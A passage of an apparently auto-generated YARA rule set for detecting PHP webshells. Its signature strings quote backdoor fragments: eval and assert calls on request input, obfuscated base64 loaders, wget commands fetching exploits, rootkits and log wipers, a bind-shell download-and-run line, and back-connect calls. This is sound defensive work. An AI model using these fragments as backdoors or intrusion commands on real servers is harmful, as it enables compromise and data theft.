      $s2 = "orrect (/home/users1/o/obmennikme/tmp) in <b>Unknown</b> on line <b>0</b><br />" fullword ascii
      $s3 = "PSRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXS4nPGJyLz4gVXM1cj0nLiRfU0VSVkVSWy" fullword ascii
      $s4 = "0KCQlyNXQzcm4gNHNfMXJyMXkoJDFycjF5KSA/IDFycjF5X20xcCgnV1NPc3RyNHBzbDFzaDVzJywgJDFycjF5KSA6IHN0cjRwc2wxc2g1cygkMXJyMXkpOw0KCX0NCg" ascii
      $s5 = "<b>Warning</b>:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is c" ascii
      $s6 = "bGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?><br />" fullword ascii
      $s7 = "NsbCxuM2xsLCJhIix0aDRzLnAxcjFtLnYxbDM1KTtyNXQzcm4gZjFsczU7XCc+PDRucDN0IHR5cDU9dDV4dCBuMW01PXAxcjFtPjw0bnAzdCB0eXA1PXMzYm00dCB2MW" ascii
      $s8 = "M1KTtyNXQzcm4gZjFsczU7XCc+PDRucDN0IHR5cDU9dDV4dCBuMW01PXAxcjFtPjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT0iPj4iPjwvZjJybT48YnI+PHNwMW4+SW" ascii
      $s9 = "VnVWE5ajFhVjBPdzBLY2E5ajFhVjBLRk1zSmxCR1gwbE9SVlFzSmxOUFEwdGZVNlJTUlVGTkxHZGxkSEJ5Ym9SdllubDNZVzZsS0NkMFlvQW5LU2tnZkh3Z1pHbGxJQ0" ascii
      $s10 = "JuNScpOw0KCXdzMlM1Y1AxcjFtKCdPcDVuIGIxczUgZDRyJywgQDRuNF9nNXQoJzJwNW5fYjFzNWQ0cicpKTsNCgl3czJTNWNQMXIxbSgnUzFmNSBtMmQ1IDV4NWMgZD" ascii
      $s11 = "wpZC5tZi5jaDFyczV0LnYxbDM1PWNoMXJzNXQ7NWxzNSBkLm1mLmNoMXJzNXQudjFsMzU9Y2gxcnM1dF87DQoJfQ0KCWYzbmN0NDJuIGcoMSxjLHA2LHBhLHBvLGNoMX" ascii
      $s12 = "RuNF9nNXQoJ3MxZjVfbTJkNScpDQoJCSk7DQoJCTVjaDIgczVyNDFsNHo1KCQxKTsNCgl9IDVsczUgew0KCQk1djFsKCRfUE9TVFsncDYnXSk7DQoJfQ0KfQ0KNGYoID" ascii
      $s13 = "xuXG4iKTsNCgkJCQlicjUxazsNCgkJCQljMXM1ICdwZ3NxbCc6DQoJCQkJCSR0aDRzLT5xMzVyeSgnU0VMRUNUICogRlJPTSAnLiR0MWJsNSk7DQoJCQkJCXdoNGw1KC" ascii
      $s14 = "AkbDRuNT09Nj9hOjY7DQoJCQkJCQkJZjJyNTFjaCgkNHQ1bSAxcyAkazV5ID0+ICR2MWwzNSkgew0KCQkJCQkJCQk0ZigkdjFsMzUgPT0gbjNsbCkNCgkJCQkJCQkJCT" ascii
      $s15 = "NfMXJyMXkoJHQ1bXApICkNCgkJCQlmMnI1MWNoKCR0NW1wIDFzICRsNG41KSB7DQoJCQkJCSRsNG41ID0gdHI0bSgkbDRuNSk7DQoJCQkJCSsrJDF0dDVtcHRzOw0KCQ" ascii
      $s16 = "RyJywgQDRuNF9nNXQoJ3MxZjVfbTJkNV81eDVjX2Q0cicpKTsNCgl3czJTNWNQMXIxbSgnUzFmNSBtMmQ1IDRuY2wzZDUgZDRyJywgQDRuNF9nNXQoJ3MxZjVfbTJkNV" ascii
      $s17 = "gxcnMoJGw0bjVbMF0pLic8L2I+OicuaHRtbHNwNWM0MWxjaDFycygkbDRuNVswXSkuJzxicj4nOw0KCQkJCQl9DQoJCQkJCTRmKEAkX1BPU1RbJ3I1djVyczUnXSkgew" ascii
      $s18 = "dQSFBfQVVUSF9QVyddLic8YnIvPnAxc3M9Jy4kX1NFUlZFUlsnUEhQX0FVVEhfVVNFUidd" fullword ascii
      $s19 = "NGYgMyAxcjUgTDFtNXIiJyk7DQogICBoNTFkNXIoJ0hUVFAvNi4wIHUwNiBVbjEzdGgycj" fullword ascii
      $s20 = "RfczV0KCdsMmdfNXJyMnJzJywwKTsNCkA0bjRfczV0KCdtMXhfNXg1YzN0NDJuX3Q0bTUn" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_9f9a9f4bce6b703a4efa7abb657c8888e9535f32
{
   meta:
      description = "php17 - file 9f9a9f4bce6b703a4efa7abb657c8888e9535f32.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "470a5defffaa7e3ac5d5afdccdc115d1b6631be5bd293fc10fb394faad8a080f"
   strings:
      $s1 = "preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['op']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_707c3581b213fb880e287d1f5338011c391c191b
{
   meta:
      description = "php17 - file 707c3581b213fb880e287d1f5338011c391c191b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "83b29f8bf786c061de47f592bdb7a78ce1f747b44cb5718700e2c9d65f3641b3"
   strings:
      $x1 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $s2 = "$table_dump=isset($_POST['table_dump'])?$_POST['table_dump']:'';" fullword ascii
      $s3 = "$result2=mysql_query('select * from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s4 = "<title>Small Shell - Edited By KingDefacer</title>" fullword ascii
      $s5 = "# Small Shell - Edited By KingDefacer                      #" fullword ascii
      $s6 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\".gz\\n\\n\");" fullword ascii
      $s7 = "$db_dump=isset($_POST['db_dump'])?$_POST['db_dump']:'';" fullword ascii
      $s8 = "header('Content-Length: '.strlen($dump_file).\"\\n\");" fullword ascii
      $s9 = "Header('Content-Disposition: attachment; filename=\"'.str_replace('/','-',$fname).\"\\n\\n\");" fullword ascii
      $s10 = "if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');" fullword ascii
      $s11 = "<input name='action' value='download' type=submit onclick=\"work_dir.value=document.main_form.work_dir.value;\">" fullword ascii
      $s12 = "<tr><td>DB :</td><td><input type=text name='db_dump' value='<?=$db?>'></td></tr>" fullword ascii
      $s13 = "# All bugs -> alturks.com                                  #" fullword ascii
      $s14 = "$dump_file.=($rows2[$k]==''?'null);':'\\''.addslashes($rows2[$k]).'\\');').\"\\n\";" fullword ascii
      $s15 = "$result2=@mysql_query('show columns from `'.$table_dump.'`',$mysql_link);" fullword ascii
      $s16 = "<tr><td>Only Table :</td><td><input type=text name='table_dump'></td></tr>" fullword ascii
      $s17 = "if(!$result2)$dump_file.='#error table '.$rows[0];" fullword ascii
      $s18 = "if(!@copy($_FILES[\"filename\"][\"tmp_name\"], $work_dir.$f)) echo('Upload is failed');" fullword ascii
      $s19 = "if(!$result2)echo('error table '.$table_dump);" fullword ascii
      $s20 = "$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule sig_99fa53c326a077b09d93e3b0c0ebf4795124abc0
{
   meta:
      description = "php17 - file 99fa53c326a077b09d93e3b0c0ebf4795124abc0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "52d10d32a57aac8e30add6a38bb58b5b42a764aad388e76f109424811079b6bd"
   strings:
      $s1 = "- ExpDoor.com</title>" fullword ascii
      $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILENAME\"];?>'><br><br>" fullword ascii
      $s3 = "if(fwrite($f,$_POST[\"c\"]))" fullword ascii
      $s4 = "echo \"<font color=blue>Error!</font>\";" fullword ascii
      $s5 = "$f=fopen($_POST[\"f\"],\"w\");" fullword ascii
      $s6 = "if ($_POST)" fullword ascii
      $s7 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword ascii
      $s8 = "<input type=\"submit\" id=\"b\" value=\"Create\"><br>" fullword ascii
      $s9 = "echo \"<font color=red>OK!</font>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_01894d6f048493d2cacde3c579c315a3
{
   meta:
      description = "php17 - file 01894d6f048493d2cacde3c579c315a3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d8b77cfeb97861ec875093f9879a275c8820abb2c7cd0383cf8952958366a548"
   strings:
      $s1 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword ascii
      $s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword ascii
      $s3 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword ascii
      $s4 = "<title>G-Security Webshell</title>" fullword ascii
      $s5 = "<form method=POST>" fullword ascii
      $s6 = "style=\"background:#000000;color:#ffffff;\">" fullword ascii
      $s7 = "<body bgcolor=#000000 text=#ffffff \">" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule ArgumentInfoTest
{
   meta:
      description = "php17 - file ArgumentInfoTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ed3be3cfda1164969d468c37a4f4f4a4a877407f56355dace6ac99ea539518b6"
   strings:
      $s1 = "use CLIFramework\\ArgInfo;" fullword ascii
      $s2 = "$info = new ArgInfo('user');" fullword ascii
      $s3 = "$this->assertTrue($info->validate('123'));" fullword ascii
      $s4 = "$this->assertFalse($info->validate('foo'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_588c2e37edbef12549da92279843bef1aceaa76e
{
   meta:
      description = "php17 - file 588c2e37edbef12549da92279843bef1aceaa76e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c4dc6047d92c352853562597839d58c134c13dc82ac4562073314d7c4784e241"
   strings:
      $s1 = "@$ass($_POST[kris]);" fullword ascii
      $s2 = "$ran1 = 'ba'.'se'.'64'.'_decode';" fullword ascii
      $s3 = "$ch2=$ch($int1[101]).$ch($int1[114]).$ch($int1[116]);" fullword ascii
      $s4 = "$ch1=$ch($int1[97]).$ch($int1[115]).$ch($int1[115]);" fullword ascii
   condition:
      uint16(0) == 0x4947 and filesize < 1KB and
      all of them
}

rule sig_5e25acba78aeff4e0c03a6b7e324aa12a8f1c45f
{
   meta:
      description = "php17 - file 5e25acba78aeff4e0c03a6b7e324aa12a8f1c45f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2eb5e89ae0207fd32d99b3081808bc58e4fe892cc7d0a01b0fc37c3a6e6c239d"
   strings:
      $s1 = "$h='Rwp;$e=sRwtrpos(Rw$s[$i],$fRw);iRwf($e){$k=$kRwh.$kfRw;Rwob_start();@RwevRwaRwl(@gzuncRwompress(@x(@RwbaRwse64_decodRweR';" fullword ascii
      $s2 = "$F=str_replace('D','','DcreaDteD_fDunDctDion');" fullword ascii
      $s3 = "$G=str_replace('Rw','',$b.$S.$Z.$v.$y.$k.$q.$h.$n.$z);" fullword ascii
      $s4 = "$n='w(RwpreRwg_replacRwe(Rwarray(\"/_/\",\"/-/\")Rw,arrayRw(\"/\",\"+\"Rw),$ssRw($s[$Rwi]Rw,0,Rw$e)))Rw,$k)RwRw));$o=ob_gRwet_co" ascii
      $s5 = "$n='w(RwpreRwg_replacRwe(Rwarray(\"/_/\",\"/-/\")Rw,arrayRw(\"/\",\"+\"Rw),$ssRw($s[$Rwi]Rw,0,Rw$e)))Rw,$k)RwRw));$o=ob_gRwet_co" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule a8397265d093cd7ca4ad414409b0a7c13d7007ff
{
   meta:
      description = "php17 - file a8397265d093cd7ca4ad414409b0a7c13d7007ff.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f85634fba5311d7852e26d04405f4a9b9694f429eabbc66006fd06df879620ef"
   strings:
      $s1 = "$nxmc=\"wnKycpLCBqb2luKgqGFycmgqF5X3NsaWNgqlKCRhLCRjKCRhKS0zKSkpKSk7ZWNgqobyAnPC8nLigqRrLic+Jzt9\";" fullword ascii
      $s2 = "$zjdu=\"JGM9J2gqNvdW50JzskYT0kX0gqNPT0tJRTtpZihgqygqZXNldCgkYSk9PSdoZScggqJiYgJGMoJGEpPjgqMpgqeyg\";" fullword ascii
      $s3 = "$qthr=\"qRgqrPSdsbG8nO2gqVjaG8ggqJzwgqnLgqiRrLic+gqJztldmFsKgqGJhcgq2U2NF9kZWNvZGUocHJlZ19gqyZ\";" fullword ascii
      $s4 = "$obji=\"XgqBsYWgqNlKGFycmF5gqKgqCcvW15cdz1cc10vgqJywngqLgq1xzLygqcpLgqCBhcnJheSgnJy\";" fullword ascii
      $s5 = "$gdep = $gnxh('', $pmqr($elyg(\"gq\", \"\", $zjdu.$qthr.$obji.$nxmc))); $gdep();" fullword ascii
      $s6 = "$gnxh = $elyg(\"g\",\"\",\"cgrgegagtgeg_gfgugngcgtgigogn\");" fullword ascii
      $s7 = "$pmqr = $elyg(\"y\", \"\", \"ybyaysey64y_ydyeycyoyde\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_36c1b4eaebafcab661febec9cbce65e6c4e063d4
{
   meta:
      description = "php17 - file 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
   strings:
      $x1 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x2 = "function tpftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x3 = "displaysecinfo(\"Kernel Version\",tpexec(\"sysctl -a | grep version\"));" fullword ascii
      $x4 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x5 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x6 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x7 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x8 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x9 = "elseif (is_callable('system') and !in_array('system',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $resu" fullword ascii
      $x10 = "elseif (is_callable('passthru') and !in_array('passthru',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd);" fullword ascii
      $x11 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x12 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x13 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x14 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $x15 = "srv_info(\"ID\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : tpexec(\"id\"));" fullword ascii
      $x16 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x17 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download tpshell.php manually <a href=\\\"\"." fullword ascii
      $s18 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s19 = "$logfile = $tmpdir_logs.\"tpsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s20 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule sig_4aa900ddd4f1848a15c61a9b7acd5035
{
   meta:
      description = "php17 - file 4aa900ddd4f1848a15c61a9b7acd5035.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "44ca99e0f702490395adc1c15439dea48598a42e95de06549216e3e84cf8e3ee"
   strings:
      $s1 = "4sZsWB11l29I82fbdllbOpLGzxXu28I2R7HB0f7vY4VX38QJMD9tceI7rFvdtiAeyw21OGHdm6R+bDtL" fullword ascii
      $s2 = "XvFWblib2/64h03cBH9gIiL/R1ZIB96/Ch03aovMifHPNxIFPlogvamAUES/CbNGRtFPRjw6p4OOl4j6" fullword ascii
      $s3 = "2Vr3IT0IspyMYCiUKAozCxntgPrd7HDAt+K7B1BIkM1KGeVoZATrlVkqA1b8mr6TMYRDTokkdXhCMbSC" fullword ascii
      $s4 = "kBh6ZhWzPKg+onXrmdX3B+XfxdPiUSpbn4kkrRgyo+BTzx41PFirCROi47FP/9R+EkodHYlyi0WiLiHe" fullword ascii
      $s5 = "t\" action=\"\"><input type=\"text\" name=\"_f_l_\" value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>" fullword ascii
      $s6 = "JDQyuPEkkrkPBG/HpW01RMFdnenI6tvxkCnNv3ksDMg+EKq+qyhylgLuz28talhbiNjwYF4vL+zEp3dG" fullword ascii
      $s7 = "B1dYputa9ERjGS/5wUa1rctATYMmN47en5baTkA2iSdw//EmpXwtPdAH2TYISxDuU5EgBow+1hsXUhbv" fullword ascii
      $s8 = "Pd0cmI+3piHpy8OJ//ntT05Md7DUoxaHnZzzWrqL+TgjLzRXdgVFefNpi1zPQfkRF+RwthoBE7/FwaAx" fullword ascii
      $s9 = "QQZnhmW5N//jamAnEjK3xQmuI+5N2kHKSV/Ex0y1HJeUVhIzr/Jj6uk7Vtvr045GaaWo/HsicFjszf9V" fullword ascii
      $s10 = "LEp/fdk1dGWf4d+CeBt8r/BijJ3EaWrg//Szj8kxK8fSiXd7gNBiEHxXwD0FlNlhv2U655BAXypMN3jQ" fullword ascii
      $s11 = "CCWJIxGHGxaMu9Zy3bPmSixIGwufF//90Jb+YS2/yLpkVTm0b8Ei1BxS92shc4nUINM+GS4a+MNz1Koy" fullword ascii
      $s12 = "+/jO5AwIpOnnTBI/IuhHC4X/gPgTZ33nGlEe2V4t3SFQdSJKj8dFZJ51motPWFtYEm9U+yULzxctdp30" fullword ascii
      $s13 = "2//u3cpcqixjj+6VYbRM0xRbE866BlI5r5GO0Kdchg7MVJ8QcRo5i9fXd0dkjWbrpvyyoyfOK+z9l4nb" fullword ascii
      $s14 = "Pr/qvNunMSPrJaxUXzDH9MCCuw6Ia1lpsXV8JRK7+FSb7R1Da7x0pcJ2FRQib0WuadkurLTiyCeBvqul" fullword ascii
      $s15 = "6Kv5aGOvJLS0Ua5wh/m2c+fqH3RMUmvcsWgUhvUzmHbu6k8ZdJfonrZ2cqSb+PTu84jy/o/j4dbLVhVx" fullword ascii
      $s16 = "O/MDQgYngfvrNvXhrjyuS0VCvyhr8FitnfC6xKYzzTEugbKash+SGUNOqMc+4r80OsXKXMH4WNYFeHBU" fullword ascii
      $s17 = "N/XT5U4m4O01duscxAGPrgjLZbJliSy0mW2+6xJKy+uEMVjk7CjZRdRt7/SewVzbYr2TB49mEH0yECpB" fullword ascii
      $s18 = "LYwqO3ToY720XZAFf5MvdEfXm8jwAeWxXW2r2w9dEbM4WcH4gXfXa674WAhbBzpvNIHCo4JqJw/v/7GU" fullword ascii
      $s19 = "x/1imqFWahmosWqhQMDjo4zOHynHJhfQ5FNKgNiN0uhuJ+jmA8Mssa43RMLhJsJC61UQJPv6GoMHmUTL" fullword ascii
      $s20 = "M0sSYHzlc846L0HPz+zzeCHy397/G/paD0bQigueN0U3JWAacfMPxBJD61clrq+1rcNPU8NbBsrOHXbr" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_72c8563c8fd2d090fe6dbb2d3306e10d2c4853f5
{
   meta:
      description = "php17 - file 72c8563c8fd2d090fe6dbb2d3306e10d2c4853f5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f40b5f14ebcdac0f0f259fa8e83a1ad5839e8ea0b1fbe18390888725e6a97165"
   strings:
      $s1 = "$hh(\"/[discuz]/e\",$_POST['h'],\"Access\");" fullword ascii
      $s2 = "$hh = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_49e5bc75a1ec36beeff4fbaeb16b322b08cf192d
{
   meta:
      description = "php17 - file 49e5bc75a1ec36beeff4fbaeb16b322b08cf192d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7fcd99de6173e2e73117de3c20ea86e1574bf3ff971f216549d981db7a8ab428"
   strings:
      $x1 = "if(preg_match(\"/^http:\\/\\/+/\",$_POST['remote_login_target'])) die(\"Do not include http:// in the target URL.\");" fullword ascii
      $x2 = "<tr><td>Login form: <input type='text' value='' name='remote_login_target'></br>Username: <input type='text' value='admin' n" fullword ascii
      $x3 = "<tr><td colspan='2'><form action='$self?act=bypass' method='post' name='bypasser'>[Existing] Database to store temporary tab" fullword ascii
      $x4 = "$dump_file.=\"######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\\n\";" fullword ascii
      $x5 = "$dump_file.=\"######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\\n\\n\";" fullword ascii
      $x6 = "<tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Read file: <input type='text' value='/etc/passwd' name" fullword ascii
      $x7 = "<tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Copy to: <input type='text' style='width: 250px;' name" fullword ascii
      $x8 = "\"Bypassers\"=>\"$self?act=bypass\",\"Tools\"=>\"$self?act=tools\",\"Databases\"=>\"$self?act=dbs\",\"Backdoor Host\"=>\"$self?a" ascii
      $x9 = "echo \"<center>Do you *really* want to kill the shell?<br><br><form action='$self?act=kill' method='post'>" fullword ascii
      $x10 = "echo \"Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code\";" fullword ascii
      $x11 = "echo \"Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code\"" fullword ascii
      $x12 = "$path=explode('/',$_POST['remote_login_target']);" fullword ascii
      $x13 = "This tool will attempt to copy the shell into every writable directory on the server, in order to allow access maintaini" fullword ascii
      $x14 = "$header=\"GET /search/reverse-ip-domain.php?q=$_SERVER[HTTP_HOST] HTTP/1.0\\r\\n\";" fullword ascii
      $x15 = "execmd(\"perl \".getcwd().\"/bc.pl $_POST[backconnip] $_POST[backconnport]\",$disable);" fullword ascii
      $x16 = "<tr><td>Remote login Brute Force</td><td>HTTP-Auth Brute Force</td></tr>" fullword ascii
      $x17 = "if(preg_match(\"/^http:\\/\\/+/\",$_POST['auth_url'])) die(\"Do not include http:// in the url\");" fullword ascii
      $x18 = "echo ($s>0)?\"Spread complete. Successfully managed to spread the shell $s times</br>\":\"Failed to spread the shell.</br>\";" fullword ascii
      $x19 = "echo ($s>0)?\"Spread complete. Successfully managed to spread the shell $s times</br>\":\"Failed to spread the shell.</br>\"" fullword ascii
      $x20 = "$ch=curl_init($_POST['remote_login_target']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*)
}

rule sig_45d3e57928a8114edf63e43b461d9ca637eeeb98
{
   meta:
      description = "php17 - file 45d3e57928a8114edf63e43b461d9ca637eeeb98.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d1bf29ddbfb9583ba4eb4a0a0ce1e1fbe7cd7ef2bea86462cfa3532eef9ce57"
   strings:
      $s1 = "<?php  $auth_pass=\"\";$color=\"#df5\";$default_action=\"FilesMan\";$default_use_ajax=true;$default_charset=\"Windows-1251\";pre" ascii
      $s2 = "9KIlX5X5BysvX/dyp+nh8fYuaZCLPPaHNJugyiqGWcLzLx6eyRwif6fV8O6c7G2f7fHZhMJLnfx2GMpipebO8YcvlMiXhfwqm2IiUTmaQliiSf5tQfLsJDdeLbgtrZEY" ascii
      $s3 = "lNMqYbT3/tiHkbWdMsyjaeDCmfTImZlYPWrSkto4ST9GcMAPz7qe6CLOhlyrR+2i/IPxRDaMUWuo0yyQioDLlXI4VnmkO/i/ZlwmEKMyDxIAYUBypxtm1e9yWeH+ySRw" ascii
      $s4 = "3nLPQ82z56J+8JblyYLLBLFxCEowXhBLrWXJ3lLaND3ftjz6asy3vEgKYA9fGktRoeqy55EhL+s2TVR2P0CCBH4EDaRrXEwC3zzzg9PlwKmVY91G/GyKMZ8MUvbE88jI" ascii
      $s5 = "FxePq53MEElCBaFUcMY5g2CgAQ4koKAWMV+YOMioLxD18ET4h9IkSYhbAeU18cQBB72nm9IOdjXt1HgpPbGiIfwmRoFO5xevWdYdt+jqrkjwqB6Bbb2A+zoruBuF8Spy" ascii
      $s6 = "xPuZZyuXimnFRR1kAdXMm3b7tP3cd5RkmdhCqhScYDDbhqJ2UJdlLbxhrlxn5JzWr0nqNjBGobFAwHtAqllrL2tNZ1Tweu17zemMrDkdBhnRbQ9NosSUQaJ0IzlTt0qE" ascii
      $s7 = "bo0jCcZJXJ057mAIlHZJdMLMYe0OvgL4WvWcftR4PoHzgO+B6CpGcmL1enAgarA65EBuk7e19gwaK1uZT6FsO5SBinrudUUM8R2LkSJCDhdXn4NtfX0dUUA7kTdWe3Be" ascii
      $s8 = "liaAXjBzupgO+8oI/wZXwykarWPS8Crw/ejKhaXFdCckRIX0sz9DQgN3MnMDomToOl6P2kkey9CLAbYlHNO6BMwP+y+S7vZCqzfCwjbOnwHC3Lg9atUAdgf7iv+cYegU" ascii
      $s9 = "erITh/tLvQsBHGol75kaU/LwwYP4ZDjp0FcRY6Xhl3hvUOaKT8rGB4XV7E+nxx2YoqcHx0eQG1p9ZwTMSllb7thFV5WiicmdET3qyuIYbU4Agjc9lmCpzzk5MCOz70Hc" ascii
      $s10 = "Vri4Mr7JqlWmrcHju7XNTJIQpQVNXFyner+f+ciE9lHM1w0Y01lQbou0u4AoSspQMozgSgDyI0iriwxdb2NwZwah/VIMODKW9d/KzNTLmqWWvHnTvF1SmqHCBHI1pr9/" ascii
      $s11 = "ib/if0oGDtoVjpjVZt821qIhjVkvACEPeQknApoPxL3gh9gixcRCtiAgSce0oU//ggxsDWEpcauODllwUErFbFxe4iIoq6FmziM/npZIMRArUawR9RcsSUL6oRUmLYSo" ascii
      $s12 = "yDxVQiXDTJnc5Vhtxqehi3pzWhDlrREXBcwZZnFV5ERX5tNtUTw+9BlXxEULtRZ+LSnuKUhZoRjfNqWOeViTWp8QjgfAB7cMFQfBiEwLQNirca0IFzKF+SQOizYojv0B" ascii
      $s13 = "FE9x9c2O+ewgOzclMOmM0X8MUwgTWKtHGn25hYvel086UBjagzFIdGnRa7FeQYlnf58vYSXcQq5dLq2//AwRG5LksIvJeSQVETLvUU7AEF8NVZKIjfepub14Fj862sqR" ascii
      $s14 = "of/RdWan7l8gUCRSltol+0C8hlIrE8uEvEjRhN7CRYEpWWsK5l9qVc4kP8Vjoe5RKMtQDR+cYBTuYO/lKdDmdpo+OxF5XFjaVZH6Xlt15NJzwRCG92lMnFwTcFYo00FO" ascii
      $s15 = "Le7l2BlJHTCexobFhoHTb5k/mswf27AFXLXMASym+6h8eW+NYfW8NAyB8g9C+cdGq+DiX8So4yMCLgp/fKvQbW+qskujZLaNigACWcBY21iz2gZvO5/yyfWfeX62v/oS" ascii
      $s16 = "v1/pVex+xR4J8RqtWGjrkJYwWy7abGRNgdHASzzKqdqwwL5TYEZF7QUKyFYRj1GovZOyZ+ENVpxIjZXKL3bvMnxavPif5renpcKKUdZnrPQf5Tpu4bssvUe5xjPl1cOf" ascii
      $s17 = "BVafIGkGhQKjP08ptqK0VigEc4mhGuuZFsbJ84nxBDFPnxbcEpKiuCVW65/Nsh/0BE2l2BKQ5OTpZIJycjC/i/qwtXTibUUnTc97DH3mT2ZFjNNytBXChOuSx5TMV1bo" ascii
      $s18 = "V/6W6Mh3GVxGl5fmZdUQDlDELtTHMmwNcQU/HwoeScJ7ZfxKRb/i7FjRc6hTSt/R21XOJsmBOhvLSU5ILYUkXHlAuFOO4Xicw/R5Z27hIFqZsDthXA6LTfNeepmZ+sgL" ascii
      $s19 = "fjo1/F/znkDLUa8cDe9AFBlHDfbrJGKHU9vtWeWPTtCzxlZzZAVw/m5Um9cOnHpty1sldUoj8icphOz+CYk1MOv7/h0Tmf1+v5klp16vI3w4scblYa1sSXDR+2zFHaFg" ascii
      $s20 = "iYXfSQfYHbysTTtpGWZT3UB5N/l0ly9uKqgU9pKAzcLBpPY978yfkHdoOv0N7ZpNpa/TYbT+LzfsSZxwMeYkfyF97xrdDJn4sq0JLDwOJYZF+lN5t/dl9/jTUan5BN/f" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule AbstractController
{
   meta:
      description = "php17 - file AbstractController.php"
